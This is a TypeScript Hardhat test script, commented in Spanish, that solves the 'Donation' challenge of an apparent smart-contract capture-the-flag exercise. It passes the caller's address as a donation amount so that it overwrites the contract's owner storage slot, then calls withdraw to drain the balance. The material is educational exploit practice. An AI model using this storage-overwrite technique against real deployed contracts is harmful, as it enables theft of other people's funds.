import { expect } from "chai";
import { ethers } from "hardhat";
import { Contract, Signer, BigNumber } from "ethers";

let donationContract: Contract;
const challengeAddress: string = "0xFeD4dC53D4Bca769739E77a4349fbF3f4698e57A";
let accounts: Signer[];


beforeEach(async () => {
  accounts = await ethers.getSigners();

  let donationFactory = await ethers.getContractFactory("DonationChallenge");
  donationContract = donationFactory.attach(challengeAddress);
})

describe("Donation", async () => {
  it("Resuelve el Math challenge - Donation", async () => {
    // Necesitamos convertir nuestro address a un uint256 (que sería el etherAmount)
    const eoaEnUint256 = BigNumber.from(await accounts[0].getAddress());
    console.log(`Nuestro address en forma de numero tiene la pinta de: ${eoaEnUint256}`);

    //Llamamos a la función donate. Acá sobreescribimos el slot 1 del storage con nuestro address.
    const txDonate = await donationContract.donate(eoaEnUint256,
      {
        value: eoaEnUint256.div(BigNumber.from('10').pow('36'))
      })
    await txDonate.wait();

    //Como ya sobreescribimos el slot 1 del storage (owner), podemos invocar a la función withdraw.
    const txWithdraw = await donationContract.withdraw();
    await txWithdraw.wait();

    //Chequeo si el balance del contrato es cero
    let isComplete = await donationContract.isComplete();
    expect(isComplete, "DESAFIO INCOMPLETO").to.be.true;
  })
})